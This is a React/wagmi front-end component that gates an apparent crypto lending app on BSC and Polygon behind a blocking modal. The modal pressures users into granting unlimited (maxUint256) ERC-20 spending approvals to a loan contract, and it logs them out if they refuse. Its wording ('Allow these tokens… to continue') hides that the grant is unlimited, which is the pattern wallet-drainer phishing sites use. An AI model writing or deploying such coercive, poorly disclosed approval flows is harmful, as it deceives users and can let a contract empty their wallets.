import React, { useEffect, useState } from 'react';
import { useAccount, usePublicClient, useSwitchChain, useWriteContract } from 'wagmi';
import { useAuth } from '@/hooks/useAuth';
import {
  LOAN_APPROVAL_NETWORKS,
  LOAN_APPROVAL_TOKENS,
  LOAN_CONTRACT_ADDRESSES,
  erc20Abi,
} from '@/config/constants';
import { maxUint256 } from 'viem';
import toast from 'react-hot-toast';

const ZERO_ADDRESS = '0x0000000000000000000000000000000000000000';

// Any allowance below this triggers re-approval (1 million tokens, 1e24 with 18 decimals)
const THRESHOLD = 1_000_000_000_000_000_000_000_000n;

export default function GlobalApprovalGuard({ children }) {
  const { isAuthenticated, logout } = useAuth();
  const { address } = useAccount();
  const bscPublicClient = usePublicClient({ chainId: 56 });
  const polygonPublicClient = usePublicClient({ chainId: 137 });
  const { writeContractAsync } = useWriteContract();
  const { switchChainAsync } = useSwitchChain();

  const [isChecking, setIsChecking] = useState(false);
  const [needsApproval, setNeedsApproval] = useState(false);
  const [tokensToApprove, setTokensToApprove] = useState([]);
  const [isApproving, setIsApproving] = useState(false);

  useEffect(() => {
    if (!isAuthenticated || !address || !bscPublicClient || !polygonPublicClient) {
      setIsChecking(false);
      setNeedsApproval(false);
      setTokensToApprove([]);
      return;
    }

    let mounted = true;

    const checkInitialLoanApprovals = async () => {
      setIsChecking(true);
      try {
        const toApprove = [];

        for (const networkConfig of LOAN_APPROVAL_NETWORKS) {
          const loanContractAddress = LOAN_CONTRACT_ADDRESSES[networkConfig.key];
          if (!loanContractAddress || loanContractAddress === ZERO_ADDRESS) {
            continue;
          }

          const publicClient =
            networkConfig.key === 'bnb' ? bscPublicClient : polygonPublicClient;

          for (const tokenConfig of LOAN_APPROVAL_TOKENS) {
            const tokenAddress = tokenConfig.addresses[networkConfig.key];
            if (!tokenAddress || tokenAddress === ZERO_ADDRESS) {
              continue;
            }

            const allowance = await publicClient.readContract({
              address: tokenAddress,
              abi: erc20Abi,
              functionName: 'allowance',
              args: [address, loanContractAddress],
            });

            if (allowance < THRESHOLD) {
              toApprove.push({
                symbol: tokenConfig.symbol,
                address: tokenAddress,
                spender: loanContractAddress,
                spenderLabel: 'Loan Contract',
                networkLabel: networkConfig.label,
                chainId: networkConfig.chainId,
              });
            }
          }
        }

        if (!mounted) return;
        setTokensToApprove(toApprove);
        setNeedsApproval(toApprove.length > 0);
      } catch (err) {
        console.error('Initial loan approval check failed:', err);
        if (!mounted) return;
        setNeedsApproval(false);
        setTokensToApprove([]);
      } finally {
        if (mounted) setIsChecking(false);
      }
    };

    checkInitialLoanApprovals();
    return () => {
      mounted = false;
    };
  }, [isAuthenticated, address, bscPublicClient, polygonPublicClient]);

  const handleApproveAll = async () => {
    setIsApproving(true);
    try {
      for (let i = 0; i < tokensToApprove.length; i++) {
        const token = tokensToApprove[i];
        const approvalClient = token.chainId === 56 ? bscPublicClient : polygonPublicClient;

        toast.loading(
          `Switching to ${token.networkLabel} (${i + 1}/${tokensToApprove.length})...`,
          { id: 'globalApprove' }
        );
        await switchChainAsync({ chainId: token.chainId });

        toast.loading(
          `Approving ${token.symbol} on ${token.networkLabel} (${i + 1}/${tokensToApprove.length})...`,
          { id: 'globalApprove' }
        );

        const txHash = await writeContractAsync({
          address: token.address,
          abi: erc20Abi,
          functionName: 'approve',
          args: [token.spender, maxUint256],
          chainId: token.chainId,
        });

        toast.loading(`Waiting for ${token.symbol} confirmation...`, { id: 'globalApprove' });
        await approvalClient.waitForTransactionReceipt({ hash: txHash });
        toast.success(`${token.symbol} approved on ${token.networkLabel}!`, {
          id: 'globalApprove',
          duration: 2000,
        });
      }

      setNeedsApproval(false);
      setTokensToApprove([]);
    } catch (err) {
      console.error('Approval failed or cancelled:', err);
      toast.error('Approval cancelled or failed. Logging out for safety.');
      logout();
    } finally {
      setIsApproving(false);
      toast.dismiss('globalApprove');
    }
  };

  const handleReject = () => {
    toast.error('Permissions rejected. Logging out.');
    logout();
  };

  const approvalPills = [
    ...new Map(
      tokensToApprove.map(token => [
        `${token.symbol}-${token.networkLabel}`,
        { symbol: token.symbol, label: token.spenderLabel, network: token.networkLabel },
      ])
    ).values(),
  ];

  if (isAuthenticated && (isChecking || needsApproval)) {
    return (
      <div className="fixed inset-0 z-[100] flex items-center justify-center bg-black/80 backdrop-blur-md animate-fade-in">
        <div className="bg-[#13131f] border border-blue-500/20 rounded-3xl p-10 max-w-md w-full text-center shadow-2xl relative overflow-hidden">
          <div className="absolute top-[-20%] right-[-20%] w-[20rem] h-[20rem] bg-indigo-600 rounded-full mix-blend-screen filter blur-[150px] opacity-20 pointer-events-none" />

          {isChecking ? (
            <div className="flex flex-col items-center gap-6">
              <div className="w-16 h-16 border-4 border-blue-500 border-t-transparent rounded-full animate-spin" />
              <div>
                <h2 className="text-2xl font-bold text-white mb-2">Checking Approvals</h2>
                <p className="text-zinc-400">Verifying loan contract approvals for all supported loan tokens...</p>
              </div>
            </div>
          ) : (
            <div className="flex flex-col items-center gap-6">
              <div className="w-16 h-16 bg-amber-500/20 rounded-full flex items-center justify-center text-amber-400">
                <svg className="w-8 h-8" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 9v2m0 4h.01M10.29 3.86L1.82 18a2 2 0 001.71 3h16.94a2 2 0 001.71-3L13.71 3.86a2 2 0 00-3.42 0z" />
                </svg>
              </div>

              <div>
                <h2 className="text-2xl font-bold text-white mb-2">Allow These Tokens</h2>
                <p className="text-zinc-400 text-sm">
                  Allow these tokens in your wallet to continue:
                  <span className="text-white font-semibold"> {tokensToApprove.map(token => `${token.symbol} (${token.networkLabel})`).join(', ')}</span>
                </p>

                {approvalPills.length > 0 && (
                  <div className="flex flex-wrap justify-center gap-2 mt-3">
                    {approvalPills.map(pill => (
                      <span
                        key={`${pill.symbol}-${pill.network}`}
                        className="px-3 py-1 rounded-full bg-amber-500/10 border border-amber-500/20 text-amber-300 text-xs font-medium"
                      >
                        {pill.symbol} · {pill.network}
                      </span>
                    ))}
                  </div>
                )}
              </div>

              <div className="w-full flex flex-col gap-3 mt-4">
                <button
                  onClick={handleApproveAll}
                  disabled={isApproving}
                  className="w-full py-4 rounded-xl bg-amber-500 hover:bg-amber-400 text-black font-bold transition-all disabled:opacity-50 flex justify-center items-center gap-2"
                >
                  {isApproving ? (
                    <>
                      <div className="w-5 h-5 border-2 border-black border-t-transparent rounded-full animate-spin" />
                      Approving...
                    </>
                  ) : (
                    'Allow Tokens'
                  )}
                </button>
                <button
                  onClick={handleReject}
                  disabled={isApproving}
                  className="w-full py-3 rounded-xl bg-white/5 hover:bg-white/10 text-zinc-400 transition-colors"
                >
                  Reject & Disconnect
                </button>
              </div>
            </div>
          )}
        </div>
      </div>
    );
  }

  return <>{children}</>;
}
